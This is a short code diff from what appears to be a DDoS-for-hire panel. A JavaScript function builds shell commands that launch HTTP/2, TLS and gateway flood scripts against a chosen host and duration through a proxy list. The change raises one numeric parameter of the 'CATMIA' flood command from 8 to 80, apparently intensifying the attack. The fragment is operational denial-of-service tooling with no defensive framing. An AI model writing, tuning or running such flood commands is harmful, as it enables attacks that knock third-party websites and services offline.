@@ -26,7 +26,7 @@ const generateCommand = (method, host, port, time) => {
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
-            return `cd /root/methods && node httpgw.js ${host} ${time} 8 4 proxy.txt`;
+            return `cd /root/methods && node httpgw.js ${host} ${time} 80 4 proxy.txt`;
         case 'TLS':
             return `cd /root/methods && node tls.js ${host} ${time} 64 4 proxy.txt`;
         case 'BROWSER':
